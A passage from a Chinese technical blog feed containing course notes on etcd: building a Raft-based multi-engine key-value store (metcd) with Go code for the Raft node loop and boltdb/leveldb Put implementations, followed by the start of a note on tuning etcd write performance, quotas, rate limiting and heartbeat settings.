0中若未命中，则从level 1乃至更高的层次查找。level大于0时，各个SSTable中的key是不存在相互重叠的。根据manifest记录的key-value范围信息，可快递定位到具体的SSTable。同时leveldb基于 <a href="https://en.wikipedia.org/wiki/Bloom_filter">bloom filter</a> 实现了快速筛选SSTable，因此查询效率较高。</li></ul><p>更详细原理可以参考一下 <a href="https://github.com/google/leveldb">leveldb</a> 源码。</p><h2 id="实现分析"><a href="#实现分析" class="headerlink" title="实现分析"></a>实现分析</h2><p>从API设计、复制状态机、多存储引擎支持等几个方面你介绍了metcd架构设计后，接下来我就和你重点介绍下共识模块、状态机支持多存储引擎模块的核心实现要点。</p><h3 id="Raft算法库"><a href="#Raft算法库" class="headerlink" title="Raft算法库"></a>Raft算法库</h3><p>共识模块使用的是etcd <a href="https://github.com/etcd-io/etcd/tree/v3.4.9/raft">Raft算法库</a>，它是一个经过大量业务生产环境检验、具备良好可扩展性的共识算法库。</p><p>它提供了哪些接口给你使用? 如何提交一个提案，并且获取Raft共识模块输出结果呢？</p><h4 id="Raft-API"><a href="#Raft-API" class="headerlink" title="Raft API"></a>Raft API</h4><p>Raft作为一个库，它对外最核心的对象是一个名为 <a href="https://github.com/etcd-io/etcd/blob/v3.4.9/raft/node.go#L125:L203">Node</a> 的数据结构。Node表示Raft集群中的一个节点，它的输入与输出接口如下图所示，下面重点介绍它的几个接口功能：</p><ul><li>Campaign，状态转换成Candidate，发起新一轮Leader选举；</li><li>Propose，提交提案接口；</li><li>Ready，Raft状态机输出接口，它的返回是一个输出Ready数据结构类型的管道，应用需要监听此管道，获取Ready数据，处理其中的各个消息（如持久化未提交的日志条目到WAL中，发送消息给其他节点等）；</li><li>Advance，通知Raft状态机，应用已处理上一个输出的Ready数据，等待发送下一个Ready数据；</li><li>TransferLeaderShip，尝试将Leader转移到某个节点；</li><li>Step，向Raft状态机提交收到的消息，比如当Leader广播完MsgApp消息给Follower节点后，Leader收到Follower节点回复的MsgAppResp消息时，就通过Step接口将此消息提交给Raft状态机驱动其工作；</li><li>ReadIndex，用于实现线性读。</li></ul><p><img src="https://static001.geekbang.org/resource/image/a7/39/a79a97f8cc8294dcb93f9552fb638f39.png?wh=1920*787" alt="img"></p><p>上面提到的Raft状态机的输出 <a href="https://github.com/etcd-io/etcd/blob/v3.4.9/raft/node.go#L52:L90">Ready结构</a> 含有哪些信息呢? 下图是其详细字段，含义如下：</p><ul><li>SoftState，软状态。包括集群Leader和节点状态，不需要持久化到WAL；</li><li>pb.HardState，硬状态。与软状态相反，包括了节点当前Term、Vote等信息，需要持久化到WAL中；</li><li>ReadStates，用于线性一致性读；</li><li>Entries，在向其他节点发送消息之前需持久化到WAL中；</li><li>Messages，持久化Entries后，发送给其他节点的消息；</li><li>Committed Entries，已提交的日志条目，需要应用到存储状态机中；</li><li>Snapshot，快照需保存到持久化存储中；</li><li>MustSync，HardState和Entries是否要持久化到WAL中；</li></ul><p>了解完API后，接下来继续看看代码如何使用Raft的Node API。</p><p>etcd Raft库的设计抽象了网络、Raft日志存储等模块，它本身并不会进行网络、存储相关的操作，上层应用需结合自己业务场景选择内置的模块或自定义实现网络、存储、日志等模块。</p><p>因此在使用Raft库时，需要先自定义好相关网络、存储等模块，再结合上面介绍的Raft Node API，就可以完成一个Node的核心操作了。其数据结构定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// A key-value stream backed by raft</span><br><span class="hljs-keyword">type</span> raftNode <span class="hljs-keyword">struct</span> &#123;<br>   proposeC    &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>            <span class="hljs-comment">// proposed messages (k,v)</span><br>   confChangeC &lt;-<span class="hljs-keyword">chan</span> raftpb.ConfChange <span class="hljs-comment">// proposed cluster config changes</span><br>   commitC     <span class="hljs-keyword">chan</span>&lt;- *<span class="hljs-type">string</span>           <span class="hljs-comment">// entries committed to log (k,v)</span><br>   errorC      <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">error</span>             <span class="hljs-comment">// errors from raft session</span><br>   id          <span class="hljs-type">int</span>      <span class="hljs-comment">// client ID for raft session</span><br>   ......<br>   node        raft.Node<br>   raftStorage *raft.MemoryStorage<br>   wal         *wal.WAL<br>   transport *rafthttp.Transport<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个数据结构名字叫raftNode，它表示Raft集群中的一个节点。它是由我们业务应用层设计的一个组合结构。从结构体定义中你可以看到它包含了Raft核心数据结构Node(raft.Node)、Raft日志条目内存存储模块(raft.MemoryStorage）、WAL持久化模块(wal.WAL)以及网络模块(rafthttp.Transport)。</p><p>同时，它提供了三个核心的管道与业务逻辑模块、存储状态机交互：</p><ul><li>proposeC，它用来接收client发送的写请求提案消息；</li><li>confChangeC，它用来接收集群配置变化消息；</li><li>commitC，它用来输出Raft共识模块已提交的日志条目消息。</li></ul><p>在metcd项目中因为是直接基于raftexample定制开发，因此日志持久化存储、网络都使用的是etcd自带的WAL和rafthttp模块。</p><p><a href="https://github.com/etcd-io/etcd/blob/v3.4.9/wal/wal.go">WAL</a> 模块中提供了核心的保存未持久化的日志条目和快照功能接口。</p><p><a href="https://github.com/etcd-io/etcd/tree/v3.4.9/etcdserver/api/rafthttp">rafthttp</a> 模块基于HTTP协议提供了各个节点间的消息发送能力，metcd使用如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">rc.transport = &amp;rafthttp.Transport&#123;<br>   Logger:      zap.<span class="hljs-constructor">NewExample()</span>,<br>   ID:          types.<span class="hljs-constructor">ID(<span class="hljs-params">rc</span>.<span class="hljs-params">id</span>)</span>,<br>   ClusterID:   <span class="hljs-number">0x1000</span>,<br>   Raft:        rc,<br>   ServerStats: stats.<span class="hljs-constructor">NewServerStats(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)</span>,<br>   LeaderStats: stats.<span class="hljs-constructor">NewLeaderStats(<span class="hljs-params">strconv</span>.Itoa(<span class="hljs-params">rc</span>.<span class="hljs-params">id</span>)</span>),<br>   ErrorC:      make(chan error),<br>&#125;<br><br></code></pre></td></tr></table></figure><p>搞清楚Raft模块的输入、输出API，设计好raftNode结构，复用etcd的WAL、网络等模块后，接下来就只需要实现如下两个循环逻辑，处理业务层发送给proposeC和confChangeC消息、将Raft的Node输出Ready结构进行相对应的处理即可。精简后的代码如下所示：</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">func (rc *raftNode) serveChannels() &#123;<br>   // <span class="hljs-attribute">send proposals over raft</span><br><span class="hljs-attribute">   go func() &#123;</span><br><span class="hljs-attribute">      confChangeCount</span> := uint64(0)<br>      for rc<span class="hljs-variable">.proposeC</span> != nil &amp;&amp; rc<span class="hljs-variable">.confChangeC</span> != nil &#123;<br>         select &#123;<br>         case prop, ok := &lt;-rc<span class="hljs-variable">.proposeC</span>:<br>            if !ok &#123;<br>               rc<span class="hljs-variable">.proposeC</span> = nil<br>            &#125; else &#123;<br>               // blocks until accepted by raft state machine<br>               rc<span class="hljs-variable">.node</span><span class="hljs-variable">.Propose</span>(context<span class="hljs-variable">.TODO</span>(), []byte(prop))<br>            &#125;<br><br>         case cc, ok := &lt;-rc<span class="hljs-variable">.confChangeC</span>:<br>            if !ok &#123;<br>               rc<span class="hljs-variable">.confChangeC</span> = nil<br>            &#125; else &#123;<br>               confChangeCount++<br>               cc<span class="hljs-variable">.ID</span> = confChangeCount<br>               rc<span class="hljs-variable">.node</span><span class="hljs-variable">.ProposeConfChange</span>(context<span class="hljs-variable">.TODO</span>(), cc)<br>            &#125;<br>         &#125;<br>      &#125;<br>   &#125;()<br><br>   // event loop on raft state machine updates<br>   for &#123;<br>      select &#123;<br>      case &lt;-ticker<span class="hljs-variable">.C</span>:<br>         rc<span class="hljs-variable">.node</span><span class="hljs-variable">.Tick</span>()<br><br>      // store raft entries to wal, then publish over commit channel<br>      case rd := &lt;-rc<span class="hljs-variable">.node</span><span class="hljs-variable">.Ready</span>():<br>         rc<span class="hljs-variable">.wal</span><span class="hljs-variable">.Save</span>(rd<span class="hljs-variable">.HardState</span>, rd<span class="hljs-variable">.Entries</span>)<br>         if !raft<span class="hljs-variable">.IsEmptySnap</span>(rd<span class="hljs-variable">.Snapshot</span>) &#123;<br>            rc<span class="hljs-variable">.saveSnap</span>(rd<span class="hljs-variable">.Snapshot</span>)<br>            rc<span class="hljs-variable">.raftStorage</span><span class="hljs-variable">.ApplySnapshot</span>(rd<span class="hljs-variable">.Snapshot</span>)<br>            rc<span class="hljs-variable">.publishSnapshot</span>(rd<span class="hljs-variable">.Snapshot</span>)<br>         &#125;<br>         rc<span class="hljs-variable">.raftStorage</span><span class="hljs-variable">.Append</span>(rd<span class="hljs-variable">.Entries</span>)<br>         rc<span class="hljs-variable">.transport</span><span class="hljs-variable">.Send</span>(rd<span class="hljs-variable">.Messages</span>)<br>         if ok := rc<span class="hljs-variable">.publishEntries</span>(rc<span class="hljs-variable">.entriesToApply</span>(rd<span class="hljs-variable">.CommittedEntries</span>)); !<span class="hljs-attribute">ok &#123;</span><br><span class="hljs-attribute">            rc.stop()</span><br><span class="hljs-attribute">            return</span><br><span class="hljs-attribute">         &#125;</span><br><span class="hljs-attribute">         rc.maybeTriggerSnapshot()</span><br><span class="hljs-attribute">         rc.node.Advance()</span><br><span class="hljs-attribute">      &#125;</span><br><span class="hljs-attribute">   &#125;</span><br><span class="hljs-attribute">&#125;</span><br><span class="hljs-attribute"></span><br></code></pre></td></tr></table></figure><p>代码简要分析如下：</p><ul><li>从proposeC中取出提案消息，通过raft.Node.Propose API提交提案；</li><li>从confChangeC取出配置变更消息，通过raft.Node.ProposeConfChange API提交配置变化消息；</li><li>从raft.Node中获取Raft算法状态机输出到Ready结构中，将rd.Entries和rd.HardState通过WAL模块持久化，将rd.Messages通过rafthttp模块，发送给其他节点。将rd.CommittedEntries应用到业务存储状态机。</li></ul><p>以上就是Raft实现的核心流程，接下来聊聊业务存储状态机。</p><h3 id="支持多存储引擎"><a href="#支持多存储引擎" class="headerlink" title="支持多存储引擎"></a>支持多存储引擎</h3><p>在整体架构设计时，介绍了为了使metcd项目能支撑多存储引擎，将KVStore进行了抽象化设计，因此只需要实现各个存储引擎相对应的API即可。</p><p>这里以Put接口为案例，分别介绍下各个存储引擎的实现。</p><h4 id="boltdb-1"><a href="#boltdb-1" class="headerlink" title="boltdb"></a>boltdb</h4><p>首先是boltdb存储引擎，它的实现如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *boltdbKVStore)</span></span> Put(key, value <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>   s.mu.Lock()<br>   <span class="hljs-keyword">defer</span> s.mu.Unlock()<br>   <span class="hljs-comment">// Start a writable transaction.</span><br>   tx, err := s.db.Begin(<span class="hljs-literal">true</span>)<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-keyword">return</span> err<br>   &#125;<br>   <span class="hljs-keyword">defer</span> tx.Rollback()<br><br>   <span class="hljs-comment">// Use the transaction...</span><br>   bucket, err := tx.CreateBucketIfNotExists([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;keys&quot;</span>))<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      log.Printf(<span class="hljs-string">&quot;failed to put key %s, value %s, err is %v&quot;</span>, key, value, err)<br>      <span class="hljs-keyword">return</span> err<br>   &#125;<br>   err = bucket.Put([]<span class="hljs-type">byte</span>(key), []<span class="hljs-type">byte</span>(value))<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      log.Printf(<span class="hljs-string">&quot;failed to put key %s, value %s, err is %v&quot;</span>, key, value, err)<br>      <span class="hljs-keyword">return</span> err<br>   &#125;<br><br>   <span class="hljs-comment">// Commit the transaction and check for error.</span><br>   <span class="hljs-keyword">if</span> err := tx.Commit(); err != <span class="hljs-literal">nil</span> &#123;<br>      log.Printf(<span class="hljs-string">&quot;failed to commit transaction, key %s, err is %v&quot;</span>, key, err)<br>      <span class="hljs-keyword">return</span> err<br>   &#125;<br>   log.Printf(<span class="hljs-string">&quot;backend:%s,put key:%s,value:%s succ&quot;</span>, s.config.backend, key, value)<br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br><br></code></pre></td></tr></table></figure><h4 id="leveldb-1"><a href="#leveldb-1" class="headerlink" title="leveldb"></a>leveldb</h4><p>其次是leveldb，我们使用的是 <a href="https://github.com/syndtr/goleveldb">goleveldb</a>，它基于Google开源的c++ <a href="https://github.com/google/leveldb">leveldb</a> 版本实现。它提供的常用API如下所示。</p><ul><li>通过OpenFile API创建或打开一个leveldb数据库。</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">db</span>, <span class="hljs-keyword">err</span> := leveldb.OpenFile(<span class="hljs-string">&quot;path/to/db&quot;</span>, nil)<br>...<br>defer <span class="hljs-keyword">db</span>.<span class="hljs-keyword">Close</span>()<br><br></code></pre></td></tr></table></figure><ul><li>通过DB.Get&#x2F;Put&#x2F;Delete API操作数据。</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">data, err := db<span class="hljs-selector-class">.Get</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;key&quot;</span>), nil)<br>...<br>err = db<span class="hljs-selector-class">.Put</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;key&quot;</span>), <span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;value&quot;</span>), nil)<br>...<br>err = db<span class="hljs-selector-class">.Delete</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;key&quot;</span>), nil)<br>...<br><br></code></pre></td></tr></table></figure><p>了解其接口后，通过goleveldb的库，client调用就非常简单了，下面是metcd项目中，leveldb存储引擎Put接口的实现。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *leveldbKVStore)</span></span> Put(key, value <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>   err := s.db.Put([]<span class="hljs-type">byte</span>(key), []<span class="hljs-type">byte</span>(value), <span class="hljs-literal">nil</span>)<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      log.Printf(<span class="hljs-string">&quot;failed to put key %s, value %s, err is %v&quot;</span>, key, value, err)<br>      <span class="hljs-keyword">return</span> err<br>   &#125;<br>   log.Printf(<span class="hljs-string">&quot;backend:%s,put key:%s,value:%s succ&quot;</span>, s.config.backend, key, value)<br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="读写流程"><a href="#读写流程" class="headerlink" title="读写流程"></a>读写流程</h3><p>介绍完在metcd项目中如何使用Raft共识模块、支持多存储引擎后，再从整体上介绍下在metcd中写入和读取一个key-value的流程。</p><h4 id="写流程"><a href="#写流程" class="headerlink" title="写流程"></a>写流程</h4><p>当通过如下curl命令发起一个写操作时，写流程如下面架构图序号所示:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -L http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3379</span>/hello -XPUT -d world<br><br></code></pre></td></tr></table></figure><ul><li>client通过curl发送HTTP PUT请求到server；</li><li>server收到后，将消息写入到KVStore的ProposeC管道；</li><li>raftNode循环逻辑将消息通过Raft模块的Propose接口提交；</li><li>Raft模块输出Ready结构，server将日志条目持久化后，并发送给其他节点；</li><li>集群多数节点持久化此日志条目后，这个日志条目被提交给存储状态机KVStore执行；</li><li>KVStore根据启动的backend存储引擎名称，调用对应的Put接口即可。</li></ul><p><img src="https://static001.geekbang.org/resource/image/9b/c1/9b84a7e312165de46749e1c4046fc9c1.png?wh=1920*1135" alt="img"></p><h4 id="读流程"><a href="#读流程" class="headerlink" title="读流程"></a>读流程</h4><p>当通过curl命令发起一个读操作时，读流程如下面架构图序号所示：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -L http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3379</span>/hello<br>world<br><br></code></pre></td></tr></table></figure><ul><li>client通过curl发送HTTP Get请求到server；</li><li>server收到后，根据KVStore的存储引擎，从后端查询出对应的key-value数据。</li></ul><p><img src="https://static001.geekbang.org/resource/image/17/b2/1746fbd9e9435d8607e44bea2d2c39b2.png?wh=1920*1187" alt="img"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>如何基于Raft从0到1构建一个支持多存储引擎的分布式key-value数据库。</p><p>在整体架构设计上，介绍了API设计核心因素，它们分别是<strong>性能、易用性、开发效率、安全性、幂等性</strong>。其次介绍了复制状态机的原理，它由共识模块、日志模块、存储状态机模块组成。最后深入分析了多存储引擎设计，重点介绍了leveldb原理，它将随机写转换为顺序写日志和内存，通过一系列分层、创新的设计实现了优异的写性能，适合读少写多。</p><p>在实现分析上，重点介绍了Raft算法库的核心对象Node API。对于一个库而言，我们重点关注的是其输入、输出接口，业务逻辑层可通过Propose接口提交提案，通过Ready结构获取Raft算法状态机的输出内容。其次介绍了Raft算法库如何与WAL模块、Raft日志存储模块、网络模块协作完成一个写请求。</p><p>最后为了支持多存储引擎，分别基于boltdb、leveldb实现了KVStore相关接口操作，并通过读写流程图，从整体上介绍了一个读写请求在metcd中是如何工作的。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p> <a href="https://github.com/etcd-io/etcd/tree/v3.4.9/contrib/raftexample">raftexample</a> 启动的时候是如何工作的吗？它的存储引擎内存map是如何保证数据不丢失的呢？</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>17.性能及稳定性（下）：如何优化及扩展etcd写性能?</title>
    <link href="/2022/10/09/17-%E6%80%A7%E8%83%BD%E5%8F%8A%E7%A8%B3%E5%AE%9A%E6%80%A7%EF%BC%88%E4%B8%8B%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96%E5%8F%8A%E6%89%A9%E5%B1%95etcd%E5%86%99%E6%80%A7%E8%83%BD/"/>
    <url>/2022/10/09/17-%E6%80%A7%E8%83%BD%E5%8F%8A%E7%A8%B3%E5%AE%9A%E6%80%A7%EF%BC%88%E4%B8%8B%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96%E5%8F%8A%E6%89%A9%E5%B1%95etcd%E5%86%99%E6%80%A7%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="17-性能及稳定性（下）：如何优化及扩展etcd写性能"><a href="#17-性能及稳定性（下）：如何优化及扩展etcd写性能" class="headerlink" title="17.性能及稳定性（下）：如何优化及扩展etcd写性能?"></a>17.性能及稳定性（下）：如何优化及扩展etcd写性能?</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><h2 id="写性能分析链路"><a href="#写性能分析链路" class="headerlink" title="写性能分析链路"></a>写性能分析链路</h2><p>为什么写入大量key-value数据的时候，会遇到Too Many Request限速错误呢？ 是写流程中的哪些环节出现了瓶颈？</p><p>和读请求类似，总结一个开启鉴权场景的写性能瓶颈及稳定性分析链路图，并在每个核心步骤数字旁边标识了影响性能、稳定性的关键因素。</p><p><img src="https://static001.geekbang.org/resource/image/14/0a/14ac1e7f1936f2def67b7fa24914070a.png?wh=1920*1167" alt="img"></p><h2 id="db-quota"><a href="#db-quota" class="headerlink" title="db quota"></a>db quota</h2><p>首先是流程一。在etcd v3.4.9版本中，client会通过clientv3库的Round-robin负载均衡算法，从endpoint列表中轮询选择一个endpoint访问，发起gRPC调用。</p><p>然后进入流程二。etcd收到gRPC写请求后，首先经过的是Quota模块，它会影响写请求的稳定性，若db大小超过配额就无法写入。</p><p><img src="https://static001.geekbang.org/resource/image/89/e8/89c9ccbf210861836cc3b5929b7ebae8.png?wh=1920*1227" alt="img"></p><p>etcd是个小型的元数据存储，默认db quota大小是2G，超过2G就只读无法写入。因此需要根据业务场景，适当调整db quota大小，并配置的合适的压缩策略。</p><p>etcd支持按时间周期性压缩、按版本号压缩两种策略，建议压缩策略不要配置得过于频繁。比如如果按时间周期压缩，一般情况下5分钟以上压缩一次比较合适，因为压缩过程中会加一系列锁和删除boltdb数据，过于频繁的压缩会对性能有一定的影响。</p><p>一般情况下db大小尽量不要超过8G，过大的db文件和数据量对集群稳定性各方面都会有一定的影响，详细你可以参考 <a href="https://blog.longpi1.com/2022/10/07/13-db%E5%A4%A7%E5%B0%8F%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88etcd%E7%A4%BE%E5%8C%BA%E5%BB%BA%E8%AE%AEdb%E5%A4%A7%E5%B0%8F%E4%B8%8D%E8%B6%85%E8%BF%878G%EF%BC%9F/">13</a>。</p><h2 id="限速"><a href="#限速" class="headerlink" title="限速"></a>限速</h2><p>通过流程二的Quota模块后，请求就进入流程三KVServer模块。在KVServer模块里，影响写性能的核心因素是限速。</p><p><img src="https://static001.geekbang.org/resource/image/78/14/78062ff5b8c5863d8802bdfacf32yy14.png?wh=1920*1233" alt="img"></p><p>KVServer模块的写请求在提交到Raft模块前，会进行限速判断。如果Raft模块已提交的日志索引（committed index）比已应用到状态机的日志索引（applied index）超过了5000，那么它就返回一个”etcdserver: too many requests”错误给client。</p><p>那么哪些情况可能会导致committed Index远大于applied index呢?</p><p>首先是long expensive read request导致写阻塞。比如etcd 3.4版本之前长读事务会持有较长时间的buffer读锁，而写事务又需要升级锁更新buffer，因此出现写阻塞乃至超时。最终导致etcd server应用已提交的Raft日志命令到状态机缓慢。堆积过多时，则会触发限速。</p><p>其次etcd定时批量将boltdb写事务提交的时候，需要对B+ tree进行重平衡、分裂，并将freelist、dirty page、meta page持久化到磁盘。此过程需要持有boltdb事务锁，若磁盘随机写性能较差、瞬间大量写入，则也容易写阻塞，应用已提交的日志条目缓慢。</p><p>最后执行defrag等运维操作时，也会导致写阻塞，它们会持有相关锁，导致写性能下降。</p><h2 id="心跳及选举参数优化"><a href="#心跳及选举参数优化" class="headerlink" title="心跳及选举参数优化"></a>心跳及选举参数优化</h2><p>写请求经过KVServer模块后，则会提交到流程四的Raft模块。我们知道etcd写请求需要转发给Leader处理，因此影响此模块性能和稳定性的核心因素之一是集群Leader的稳定性。</p><p><img src="https://static001.geekbang.org/resource/image/66/2c/660a03c960cd56610e3c43e15c14182c.png?wh=1920*1247" alt="img"></p><p>那如何判断Leader的稳定性呢?</p><p>答案是日志和metrics。</p><p>一方面，在使用etcd过程中，你很可能见过如下Leader发送心跳超时的警告日志，你可以通过此日志判断集群是否有频繁切换Leader的风险。</p><p>另一方面，可以通过etcd_server_leader_changes_seen_total metrics来观察已发生Leader切换的次数。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">21</span>:<span class="hljs-number">30</span>:<span class="hljs-number">27</span> etcd3 | &#123;<span class="hljs-string">&quot;level&quot;</span>:<span class="hljs-string">&quot;warn&quot;</span>,<span class="hljs-string">&quot;ts&quot;</span>:<span class="hljs-string">&quot;2021-02-23T21:30:27.255+0800&quot;</span>,<span class="hljs-string">&quot;caller&quot;</span>:<span class="hljs-string">&quot;wal/wal.go:782&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;slow fdatasync&quot;</span>,<span class="hljs-string">&quot;took&quot;</span>:<span class="hljs-string">&quot;3.259857956s&quot;</span>,<span class="hljs-string">&quot;expected-duration&quot;</span>:<span class="hljs-string">&quot;1s&quot;</span>&#125;<br><span class="hljs-attribute">21</span>:<span class="hljs-number">30</span>:<span class="hljs-number">30</span> etcd3 | &#123;<span class="hljs-string">&quot;level&quot;</span>:<span class="hljs-string">&quot;warn&quot;</span>,<span class="hljs-string">&quot;ts&quot;</span>:<span class="hljs-string">&quot;2021-02-23T21:30:30.396+0800&quot;</span>,<span class="hljs-string">&quot;caller&quot;</span>:<span class="hljs-string">&quot;etcdserver/raft.go:390&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;leader failed to send out heartbeat on time; took too long, leader is overloaded likely from slow disk&quot;</span>,<span class="hljs-string">&quot;to&quot;</span>:<span class="hljs-string">&quot;91bc3c398fb3c146&quot;</span>,<span class="hljs-string">&quot;heartbeat-interval&quot;</span>:<span class="hljs-string">&quot;100ms&quot;</span>,<span class="hljs-string">&quot;expected-duration&quot;</span>:<span class="hljs-string">&quot;200ms&quot;</span>,<span class="hljs-string">&quot;exceeded-duration&quot;</span>:<span class="hljs-string">&quot;827.162111ms&quot;</span>&#125;<br><br></code></pre></td></tr></table></figure><p>那么哪些因素会导致此日志产生以及发生Leader切换呢?</p><p>首先，etcd是基于Raft协议实现数据复制和高可用的，各节点会选出一个Leader，然后Leader将写请求同步给各个Follower节点。而Follower节点如何感知Leader异常，发起选举，正是依赖Leader的心跳机制。</p><p>在etcd中，Leader节点会根据heartbeart-interval参数（默认100ms）定时向Follower节点发送心跳。如果两次发送心跳间隔超过2*heartbeart-interval，就会打印此警告日志。超过election 